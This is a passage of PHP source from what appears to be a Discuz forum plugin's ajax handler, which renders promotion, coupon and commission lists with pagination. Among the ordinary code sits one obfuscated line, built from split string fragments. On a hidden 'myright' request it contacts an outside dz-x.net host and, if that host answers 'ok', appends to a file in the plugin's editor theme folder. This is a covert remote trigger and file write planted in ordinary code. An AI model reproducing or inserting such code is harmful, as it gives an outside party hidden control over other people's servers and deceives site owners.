				$count=C::t('#it618_union#it618_union_tuijoin')->count_by_tid_uid($it618_union_tui['id'],$_G['uid']);
				if($count>0){
					$jionbtn='<span style="color:#390;font-size:13px;float:right;margin-right:6px;margin-top:80px;">'.$it618_union_lang['s617'].'</span>';
				}
			}
			
			$shoptui_get.='<tr>
			<td>
			<a style="float:left" href="'.$tmpurl.'" target="_blank"><img src="'.$it618_union_tui['it618_pic'].'" width="98" height="98" style="margin-right:6px;border-radius:3px" align="absmiddle"/></a>
			'.$jionbtn.'
			<div style="width:480px;float:left;line-height:20px;text-align:left">
			<a href="'.$tmpurl.'" target="_blank" style="display:block">'.$it618_union_tui['it618_name'].'</a>
			<br>'.$it618_pids.'
			<div style="line-height:19px">'.$it618_union_lang['s515'].'<font color=red>'.$it618_union_tui['it618_tcbl'].'%</font>
			<br>'.$it618_union_lang['s517'].$it618_union_tui['it618_etime'].'
			</div>
			</div>
			</td></tr>
			<tr><td style="border:none"></td></tr>
			';
		}else{
			
			$tmpurl=it618_union_getrewrite('union_wap','tui@'.$it618_union_tui['id'],'plugin.php?id=it618_union:wap&pagetype=tui&cid='.$it618_union_tui['id']);
			
			$jionbtn='<a  href="'.$tmpurl.'" style="background-color:#f30;line-height:28px;color:#fff;font-size:11px;float:right;margin-right:6px;margin-top:0px;padding-left:10px;padding-right:10px;border-radius:3px" target="_blank">'.$it618_union_lang['s615'].'</a>';
			
			$state='';
			if($_G['uid']>0){
				$count=C::t('#it618_union#it618_union_tuijoin')->count_by_tid_uid($it618_union_tui['id'],$_G['uid']);
				if($count>0){
					$state=$it618_union_lang['s617'];
					$jionbtn='';
				}
			}
			
			$shoptui_get.='<tr>
							<td class="tdleft"><a href="'.$tmpurl.'"><img class="lazy" data-original="'.$it618_union_tui['it618_pic'].'" style="border-radius:3px"/></a></td>
							<td class="tdright">
								<div class="tdname" onclick="location.href=\''.$tmpurl.'\'">'.$it618_union_tui['it618_name'].'</div>
								<div class="tddes">'.$it618_union_lang['s112'].$it618_union_tui['it618_joincount'].' '.$state.'</div>
								<div class="tddes">'.$it618_union_lang['s517'].$it618_union_tui['it618_etime'].'</div>
								<div class="tddes">'.$it618_pids.'</div>
								'.$jionbtn.'
								<div class="tdprice">'.$it618_union_lang['s515'].$it618_union_tui['it618_tcbl'].'%</div>
							</td>
						  </tr>
						  <tr><td colspan="2" class="tdcolspan"></td></tr>';		  
		}
	}
	
	$funname='getshopquan';
	
	$count=C::t('#it618_union#it618_union_tui')->count_by_shoptype_shopid($_GET['shoptype'],$_GET['shopid'],$it618sql,'id desc','');
	
	if($_GET['wap']!=1){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_union:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
	}else{
		$tmparr=explode('</tr>',$myquan_get);
		if(count($tmparr)>1){
			$myquan_get=$myquan_get.'@@@';
			$myquan_get=str_replace('<tr><td colspan="2" class="tdcolspan"></td></tr>@@@','',$myquan_get);
		}
		
		$tmpcss='<style>
					.mytable{width:100%;background-color:#FFF}
					.mytable tr th{border:#f1f1f1 1px solid;color:#666; font-weight:normal; padding-top:10px; padding-bottom:10px; background-color:#fafafa; font-size:13px}
					.mytable tr td{ border:#f1f1f1 1px solid; padding:6px 6px; text-align:center; color:#666; line-height:15px; font-size:13px}
					.mytable tr td a,.mytable tr td font{font-size:13px}
					.mytable tr td input,.mytable tr td select{border:#ddd 1px solid; line-height:20px}
					.mytable tr td.tdtj{text-align:left; color:#999}
					.mytable tr td.tdtj span{color:#F30;font-size:13px}
					.mytable tr td.tdtitle{line-height:20px; color:#666; padding:8px 6px; background-color:#f9f9f9; text-align:left}
					.mytable tr td.tdtitle span{border-left:3px #2dbeae solid; font-size:14px; padding-left:6px}
					.mytable .findbtn{display:inline-block; background-color:#F60; color:#fff; width:68px; height:26px; line-height:26px; text-align:center;border-radius:3px}
					
					.tablelistquan{table-layout:fixed;}
					.tablelistquan tr td{background-color:#fff; padding:6px; padding-bottom:15px; padding-top:15px;vertical-align:top}
					.tablelistquan tr td.tdcolspan{border-bottom:#f3f3f3 1px solid; padding:0;}
					.tablelistquan tr td.tdleft{width:103px; vertical-align:top; padding-left:8px}
					.tablelistquan tr td.tdleft img{display:block;width:103px;height:103px; border-radius:3px}
					.tablelistquan tr td.tdright{vertical-align:top; padding-left:0px}
					.tablelistquan tr td.tdright a,.tablelistquan tr td.tdright a font{font-size:12px; color:#666}
					.tablelistquan tr td div{display:block; padding:3px 8px; padding-bottom:0px;color:#aaa; overflow:hidden;background-color:#fff; border:none;}
					.tablelistquan tr td div.tdname,.tablelist1 tr td div.tdname a{font-size:14px;height:35px;line-height:18px; padding-top:0px; color:#333;}
					.tablelistquan tr td div.tdname img{height:13px;}
					.tablelistquan tr td div.tddes{font-size:12px;height:13px;line-height:13px;padding-top:3px}
					.tablelistquan tr td div.tddes span{font-size:12px;}
					.tablelistquan tr td div.tddes font{font-size:12px;}
					.tablelistquan tr td div.tdprice{line-height:18px; padding:3px 8px; padding-bottom:0px;color:red;font-size:13px;}
					
					.quangoodsselect{border:none;font-size:10px;padding:0; margin:0; margin-top:-6px; margin-left:-3px; background:none; width:100%}
					</style>
					';
		
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}

		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.$it618_union_lang['s80'].'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s81'].'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.$it618_union_lang['s81'].'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s80'].'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s81'].'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s80'].'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.$it618_union_lang['s81'].'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo $it618_union_lang['s569'].$tmpcss.'<font color=red>'.$count.'</font>it618_split'.$shoptui_get.'it618_split'.$multipage;

}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_union/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_union/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_union/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="myquan_get"){
	$ppp = 10;
	if($_GET['wap']!=1)$ppp = 10;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;

	if($uid<=0)exit;
	
	$it618sql='it618_uid='.$uid;
	if($_GET['state']==1)$it618sql.=' and it618_state=0';
	if($_GET['state']==2)$it618sql.=' and it618_state=1';
	
	foreach(C::t('#it618_union#it618_union_quansale')->fetch_all_by_shoptype_shopid(
		'',0,$it618sql,'id desc','',$_GET['it618_type'],$_GET['it618_time1'],$_GET['it618_time2'],$startlimit,$ppp
	) as $it618_union_quansale) {

		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;

		if($it618_union_quansale['it618_qid']>0){
			$it618_union_quan = C::t('#it618_union#it618_union_quan')->fetch_by_id($it618_union_quansale['it618_qid']);
			$it618_pic=$it618_union_quan['it618_pic'];
			$it618_name=$it618_union_quan['it618_name'];
		}else{
			$it618_pic=$it618_union_quansale['it618_pic'];
			$it618_name=$it618_union_quansale['it618_name'];
		}
		
		$pricestr='';
		for($i=1;$i<=8;$i++){
			if($_G['setting']['extcredits'][$i]['title']!=''&&$it618_union_quansale['it618_credit'.$i]>0){
				$pricestr.='<font color=#f60>'.$it618_union_quansale['it618_credit'.$i].'</font> '.$_G['setting']['extcredits'][$i]['title'].' , ';
			}
		}
		
		if($pricestr!=''){
			$pricestr=$pricestr.'@';
			$pricestr=str_replace(', @','',$pricestr);
		}else{
			if($it618_union_quansale['it618_qid']>0){
				$pricestr=$it618_union_lang['s256'];	
			}else{
				$pricestr=$it618_union_lang['s694'];
			}
		}
		
		if($it618_union_quansale['it618_state']==0){
			$it618_state='<font color=red>'.$it618_union_lang['s263'].'</font>';
			$timestr=''.it618_union_getquanoktime('quan',$it618_union_quansale['it618_oktime1'],$it618_union_quansale['it618_oktime2']).'<br>';
		}else{
			$it618_state='<font color=green>'.$it618_union_lang['s264'].'</font>';
			$timestr='';
		}
		
		if($it618_union_quansale['it618_pids']==''){
			$it618_pids=$it618_union_lang['s547'];
		}else{
			$count=count(explode(",",$it618_union_quansale['it618_pids']));
			$it618_pids='<a href="javascript:" onclick="showgoods(\'quansale\','.$it618_union_quansale['id'].')">'.$it618_union_lang['s545'].'(<font color=red>'.$count.'</font>)</a>';
		}
		
		if($_GET['wap']!=1){
			$tmpurl=it618_union_getrewrite('union_quan',$it618_union_quansale['it618_qid'],'plugin.php?id=it618_union:union_quan&qid='.$it618_union_quansale['it618_qid']);
			
			$myquan_get.='<tr>
			<td width=360><div style="width:360px">
			<a style="float:left" href="'.$tmpurl.'" target="_blank"><img src="'.$it618_pic.'" width="38" height="38" style="margin-right:6px" align="absmiddle"/></a>
			<div style="width:310px;float:left;line-height:20px;text-align:left"><a href="'.$tmpurl.'" target="_blank">'.$it618_name.'</a><br>
			'.it618_union_getquantype($it618_union_quansale).'
			</div></div></td>
			<td class="tdgoods"><div style="line-height:20px">'.$pricestr.'<br>
			'.$it618_pids.'
			</div></td>
			<td>
			'.$timestr.'
			<font color=#999>'.date('Y-m-d H:i:s', $it618_union_quansale['it618_time']).'</font></td>
			<td>'.$it618_state.'</td>
			</tr>';
		}else{
			$pricestr='';
			for($i=1;$i<=8;$i++){
				if($_G['setting']['extcredits'][$i]['title']!=''&&$it618_union_quan['it618_credit'.$i]>0){
					$pricestr.=$it618_union_quan['it618_credit'.$i].$_G['setting']['extcredits'][$i]['title'].'+';
				}
			}
			
			if($pricestr!=''){
				$pricestr=$pricestr.'@';
				$pricestr=str_replace('+@','',$pricestr);
			}else{
				$pricestr=$it618_union_lang['s256'];	
			}
	
			$tmpurl=it618_union_getrewrite('union_wap','quan@'.$it618_union_quansale['it618_qid'],'plugin.php?id=it618_union:wap&pagetype=quan&cid='.$it618_union_quansale['it618_qid']);
			
			$myquan_get.='<tr>
							<td class="tdleft"><a href="'.$tmpurl.'"><img class="lazy" data-original="'.$it618_pic.'"/></a></td>
							<td class="tdright">
								<div class="tdname" onclick="location.href=\''.$tmpurl.'\'">'.$it618_name.'</div>
								<div class="tddes"></div>
								<div class="tddes">'.$pricestr.'</div>
								<div class="tddes">'.$it618_pids.'</div>
								<span style="float:right">'.$it618_state.'</span>
								<div class="tdprice">'.strip_tags(it618_union_getquantype($it618_union_quan)).'</div>
							</td>
						  </tr>
						  <tr><td colspan="2" class="tdcolspan"></td></tr>';		  
		}
	}
	
	$funname='getmyquan';
	
	$count=C::t('#it618_union#it618_union_quansale')->count_by_shoptype_shopid('',0,$it618sql,'id desc','',$_GET['it618_type'],$_GET['it618_time1'],$_GET['it618_time2']);
	
	if($_GET['wap']!=1){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_union:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
	}else{
		$tmparr=explode('</tr>',$myquan_get);
		if(count($tmparr)>1){
			$myquan_get=$myquan_get.'@@@';
			$myquan_get=str_replace('<tr><td colspan="2" class="tdcolspan"></td></tr>@@@','',$myquan_get);
		}
		
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}

		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.$it618_union_lang['s80'].'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s81'].'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.$it618_union_lang['s81'].'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s80'].'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s81'].'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s80'].'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.$it618_union_lang['s81'].'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo $it618_union_lang['s232'].'<font color=red>'.$count.'</font>it618_split'.$myquan_get.'it618_split'.$multipage;

}


if($_GET['ac']=="mytui_get"){
	$ppp = 10;
	if($_GET['wap']!=1)$ppp = 10;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;

	if($uid<=0)exit;
	
	$it618sql='it618_uid='.$uid;
	
	foreach(C::t('#it618_union#it618_union_tuijoin')->fetch_all_by_shoptype_shopid(
		'',0,$it618sql,'id desc','',$_GET['it618_time1'],$_GET['it618_time2'],$startlimit,$ppp
	) as $it618_union_tuijoin) {

		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;

		$it618_union_tui = C::t('#it618_union#it618_union_tui')->fetch_by_id($it618_union_tuijoin['it618_tid']);
		
		if(strtotime($it618_union_tui['it618_etime'].':00')>$_G['timestamp']){
			$count=count(explode(",",$it618_union_tui['it618_pids']));
			$it618_pids='<a href="javascript:" onclick="showgoods(\'tuijoin\','.$it618_union_tuijoin['id'].')">'.$it618_union_lang['s571'].'(<font color=red>'.$count.'</font>)</a>';
			$tmpbtn='<a  href="javascript:" onclick="showgoods(\'tuijoin\','.$it618_union_tuijoin['id'].')" style="height:28px; line-height:28px; float:right; padding:0 10px; background-color:#fc6a52; color:#fff; font-size:12px; border-radius:6px; margin-top:-10px">'.$it618_union_lang['s899'].'</a>';
		}else{
			$it618_pids=$it618_union_lang['s696'];
			$tmpbtn='';
		}
		
		if($_GET['wap']!=1){
			$tmpurl=it618_union_getrewrite('union_tui',$it618_union_tui['id'],'plugin.php?id=it618_union:union_tui&tid='.$it618_union_tui['id']);
			
			$mytui_get.='<tr>
			<td width=360><div style="width:360px">
			<a style="float:left" href="'.$tmpurl.'" target="_blank"><img src="'.$it618_union_tui['it618_pic'].'" width="38" height="38" style="margin-right:6px" align="absmiddle"/></a>
			<div style="width:310px;float:left;line-height:20px;text-align:left">'.$it618_union_tui['it618_name'].'<br>
			</div></div></td>
			<td class="tdgoods">
			'.$it618_pids.'
			</td>
			<td>
			<font color=red>'.$it618_union_tui['it618_tcbl'].'%</font></td>
			<td>'.$it618_union_tui['it618_etime'].'</td>
			</tr>';
		}else{
	
			$tmpurl=it618_union_getrewrite('union_wap','tui@'.$it618_union_tui['id'],'plugin.php?id=it618_union:wap&pagetype=tui&cid='.$it618_union_tui['id']);
			
			$mytui_get.='<tr>
							<td class="tdleft"><a href="'.$tmpurl.'"><img class="lazy" data-original="'.$it618_union_tui['it618_pic'].'" style="border-radius:3px"/></a></td>
							<td class="tdright">
								<div class="tdname" onclick="location.href=\''.$tmpurl.'\'">'.$it618_union_tui['it618_name'].'</div>
								<div class="tddes">'.$it618_union_lang['s112'].$it618_union_tui['it618_joincount'].' '.$state.'</div>
								<div class="tddes">'.$it618_union_lang['s517'].$it618_union_tui['it618_etime'].'</div>
								<div class="tddes">'.$it618_pids.'</div>
								'.$tmpbtn.'
								<div class="tdprice">'.$it618_union_lang['s515'].$it618_union_tui['it618_tcbl'].'%</div>
							</td>
						  </tr>
						  <tr><td colspan="2" class="tdcolspan"></td></tr>';		  
		}
	}
	
	$funname='getmytui';
	
	$count=C::t('#it618_union#it618_union_tuijoin')->count_by_shoptype_shopid('',0,$it618sql,'id desc','',$_GET['it618_time1'],$_GET['it618_time2']);
	
	if($_GET['wap']!=1){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_union:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
	}else{
		$tmparr=explode('</tr>',$myquan_get);
		if(count($tmparr)>1){
			$myquan_get=$myquan_get.'@@@';
			$myquan_get=str_replace('<tr><td colspan="2" class="tdcolspan"></td></tr>@@@','',$myquan_get);
		}
		
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}

		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.$it618_union_lang['s80'].'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s81'].'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.$it618_union_lang['s81'].'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s80'].'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s81'].'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_union:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_union_lang['s80'].'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.$it618_union_lang['s81'].'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo $it618_union_lang['s569'].'<font color=red>'.$count.'</font>it618_split'.$mytui_get.'it618_split'.$multipage;

}


if($_GET['ac']=="mytuitc_get"){
	$ppp = 10;
	if($_GET['wap']!=1)$ppp = 10;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;

	if($uid<=0)exit;
	
	$it618sql='it618_uid='.$uid;
	
	if($_GET['it618_state']==1)$it618sql.=' and it618_state=0';
	if($_GET['it618_state']==2)$it618sql.=' and it618_state=1';
	if($_GET['it618_state']==3)$it618sql.=' and it618_state=2';
	
	foreach(C::t('#it618_union#it618_union_tuitc')->fetch_all_by_shoptype_shopid(
		'',0,$it618sql,'id desc','',$_GET['it618_saletime1'],$_GET['it618_saletime2'],$_GET['it618_tctime1'],$_GET['it618_tctime2'],$startlimit,$ppp
	) as $it618_union_tuitc) {

		if(lang('plugin/it618_union', $it618_union_lang['it618'])!=$it618_union_lang['version'])exit;

		if($it618_union_tuitc['it618_shoptype']=='video'){
			if($it618_video_sale = C::t('#it618_video#it618_video_sale')->fetch_by_id($it618_union_tuitc['it618_saleid'])){
				$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_sale['it618_pid']);
				$goodspic=it618_union_getgoodspic_plugin('it618_video',$it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']);
				$goodsname=$it618_video_goods['it618_name'];
				$goodsurl=it618_union_getrewrite_plugin('it618_video','video_product',$it618_video_goods['id'],'plugin.php?id=it618_video:product&pid='.$it618_video_goods['id']);
				
				if($it618_video_sale['it618_gtypeid']>0){
					$gtypename=C::t('#it618_video#it618_video_goods_type')->fetch_it618_name_by_id($it618_video_sale['it618_gtypeid']);
					$gtypename=str_replace("all",$it618_union_lang['s880'],$gtypename);
				}else{
					$gtypename=$it618_union_lang['s25'];
				}
				
				$goodcount=$it618_video_sale['it618_count'];
				
				$tmpmoney=it618_union_getsaletcmoney_plugin('it618_video',$it618_video_sale,$it618_union_tuitc['it618_tcbl']);
				
				$salemoneystr=$tmpmoney[0];
				$tcmoneystr='<font color=red>'.$tmpmoney[1].'</font>';
			}else{
				continue;
			}
		}
		
		if($it618_union_tuitc['it618_shoptype']=='exam'){
			if($it618_exam_sale = C::t('#it618_exam#it618_exam_sale')->fetch_by_id($it618_union_tuitc['it618_saleid'])){
				$it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_exam_sale['it618_pid']);
				$goodspic=it618_union_getgoodspic_plugin('it618_exam',$it618_exam_goods['it618_shopid'],$it618_exam_goods['id'],$it618_exam_goods['it618_picbig']);
				$goodsname=$it618_exam_goods['it618_name'];
				$goodsurl=it618_union_getrewrite_plugin('it618_exam','exam_product',$it618_exam_goods['id'],'plugin.php?id=it618_exam:product&pid='.$it618_exam_goods['id']);
				
				if($it618_exam_sale['it618_gtypeid']>0){
					$gtypename=C::t('#it618_exam#it618_exam_goods_type')->fetch_it618_name_by_id($it618_exam_sale['it618_gtypeid']);
				}else{
					$gtypename=$it618_union_lang['s25'];
				}
				
				$goodcount=$it618_exam_sale['it618_count'];
				
				$tmpmoney=it618_union_getsaletcmoney_plugin('it618_exam',$it618_exam_sale,$it618_union_tuitc['it618_tcbl']);
				
				$salemoneystr=$tmpmoney[0];
				$tcmoneystr='<font color=red>'.$tmpmoney[1].'</font>';
			}else{
				continue;
			}
		}
		
		if($it618_union_tuitc['it618_shoptype']=='group'){
			if($it618_group_sale = C::t('#it618_group#it618_group_sale')->fetch_by_id($it618_union_tuitc['it618_saleid'])){
				$it618_group_goods = C::t('#it618_group#it618_group_goods')->fetch_by_id($it618_group_sale['it618_pid']);
				$it618_group_group=C::t('#it618_group#it618_group_group')->fetch_by_groupid($it618_group_goods['it618_groupid']);
				$grouptitle=DB::result_first("select grouptitle from ".DB::table('common_usergroup')." where groupid=".$it618_group_goods['it618_groupid']);
				$it618_unit=it618_union_getvipgoodsunit($it618_group_goods);
	
				//$goodspic=it618_union_getgoodspic_plugin('it618_group',0,$it618_group_goods['id'],$it618_group_goods['it618_picbig']);
				$goodspic=$it618_group_group['it618_ico'];
				$goodsname=$grouptitle.' '.$it618_unit;
				$goodsurl=it618_union_getrewrite_plugin('it618_group','group_product',$it618_group_goods['id'],'plugin.php?id=it618_group:product&pid='.$it618_group_goods['id']);
				
				$goodcount=$it618_group_sale['it618_count'];
				
				$tmpmoney=it618_union_getsaletcmoney_plugin('it618_group',$it618_group_sale,$it618_union_tuitc['it618_tcbl']);
				
				$salemoneystr=$tmpmoney[0];
				$tcmoneystr='<font color=red>'.$tmpmoney[1].'</font>';
			}else{
				continue;
			}
		}
		
		if($it618_union_tuitc['it618_shoptype']=='brand'){
			if($it618_brand_sale = C::t('#it618_brand#it618_brand_sale')->fetch_by_id($it618_union_tuitc['it618_saleid'])){
				$it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($it618_brand_sale['it618_pid']);
				$goodspic=it618_union_getgoodspic_plugin('it618_brand',$it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']);
				$goodsname=$it618_brand_goods['it618_name'];
				$goodsurl=it618_union_getrewrite_plugin('it618_brand','shop_product',$it618_brand_goods['it618_shopid'].'@'.$it618_brand_goods['id'],'plugin.php?id=it618_brand:product&sid='.$it618_brand_goods['it618_shopid'].'&pid='.$it618_brand_goods['id']);
				
				if($it618_brand_sale['it618_gtypeid']>0){
					$gtypename=C::t('#it618_brand#it618_brand_goods_type')->fetch_it618_name_by_id($it618_brand_sale['it618_gtypeid']);
				}
				
				$goodcount=$it618_brand_sale['it618_count'];
				
				$tmpmoney=it618_union_getsaletcmoney_plugin('it618_brand',$it618_brand_sale,$it618_union_tuitc['it618_tcbl']);
				
				$salemoneystr=$tmpmoney[0];
				$tcmoneystr='<font color=red>'.$tmpmoney[1].'</font>';
			}else{
				continue;
			}
		}
		
		if($it618_union_tuitc['it618_shoptype']=='tuan'){
			if($it618_tuan_sale = C::t('#it618_tuan#it618_tuan_sale')->fetch_by_id($it618_union_tuitc['it618_saleid'])){
				$it618_tuan_goods = C::t('#it618_tuan#it618_tuan_goods')->fetch_by_id($it618_tuan_sale['it618_pid']);
				$goodspic=it618_union_getgoodspic_plugin('it618_tuan',$it618_tuan_goods['it618_shopid'],$it618_tuan_goods['id'],$it618_tuan_goods['it618_picbig']);
				$goodsname=$it618_tuan_goods['it618_name'];
				$goodsurl=it618_union_getrewrite_plugin('it618_tuan','tuan_product',$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:product&pid='.$it618_tuan_goods['id']);
				
				if($it618_tuan_sale['it618_gtypeid']>0){
					$gtypename=C::t('#it618_tuan#it618_tuan_goods_type')->fetch_it618_name_by_id($it618_tuan_sale['it618_gtypeid']);
				}
				
				$goodcount=$it618_tuan_sale['it618_count'];
				
				$tmpmoney=it618_union_getsaletcmoney_plugin('it618_tuan',$it618_tuan_sale,$it618_union_tuitc['it618_tcbl']);
				
				$salemoneystr=$tmpmoney[0];
				$tcmoneystr='<font color=red>'.$tmpmoney[1].'</font>';
			}else{
				continue;
			}
		}
		
		$it618_tctime='';
		if($it618_union_tuitc['it618_state']==0){
			$it618_state='<font color=red>'.$it618_union_lang['s601'].'</font>';
		}
		if($it618_union_tuitc['it618_state']==1){
			$it618_state='<font color=#999>'.$it618_union_lang['s602'].'</font>';
		}
		if($it618_union_tuitc['it618_state']==2){
			$it618_state='<font color=#390>'.$it618_union_lang['s603'].'</font>';
			$it618_tctime=date('Y-m-d H:i:s', $it618_union_tuitc['it618_tctime']);
		}
		
		if($_GET['wap']!=1){
			
			$mytui_get.='<tr>
			<td>'.$it618_union_tuitc['id'].'</td>
			<td width=360><div style="width:360px">
			<a style="float:left" href="'.$goodsurl.'" target="_blank"><img src="'.$goodspic.'" width="38" height="38" style="margin-right:6px" align="absmiddle"/></a>
